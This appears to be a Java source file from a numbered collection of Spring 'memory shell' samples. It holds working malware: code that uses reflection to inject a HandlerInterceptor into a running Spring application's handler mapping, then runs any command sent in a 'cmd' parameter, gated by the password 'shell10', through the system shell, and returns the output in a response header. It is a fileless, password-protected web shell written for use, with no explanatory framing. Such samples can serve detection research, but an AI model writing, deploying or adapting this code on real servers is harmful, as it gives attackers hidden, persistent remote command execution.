package com.example.springshell.memshell;

import com.example.springshell.utils.Util;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.Scanner;

public class No10_HandlerInterceptorShell implements HandlerInterceptor {

    public static String injectShell() throws IllegalAccessException {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = (RequestMappingHandlerMapping) context.getBean("requestMappingHandlerMapping");
        List<HandlerInterceptor> adaptedInterceptors = (List<HandlerInterceptor>) Util.getFieldValue(mappingHandlerMapping,"adaptedInterceptors");
        adaptedInterceptors.add(new No10_HandlerInterceptorShell());

//        for (HandlerInterceptor adaptedInterceptor : adaptedInterceptors) {
//            System.out.println(adaptedInterceptor);
//        }
        return "{\"result\":\"No10_HandlerInterceptorShell\"}";
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String passwd = request.getParameter("pass");
        String cmd = request.getParameter("cmd");
        if (passwd!=null && cmd!=null && passwd.equals("shell10") && !cmd.isEmpty()){
            try {
                boolean islinux = true;
                String osType = System.getProperty("os.name");
                if (osType !=null && osType.toLowerCase().contains("win")){
                    islinux = false;
                }
                String[] cmds = islinux ? new String[]{"sh","-c",request.getParameter("cmd")} : new String[]{"cmd.exe","/c",request.getParameter("cmd")};
                InputStream in = null;
                in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
//                response.setHeader("Exec-result",new String(Base64.getEncoder().encode(output.getBytes())));
                response.setHeader("Exec-result",new String(output));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        return HandlerInterceptor.super.preHandle(request, response, handler);
    }
}
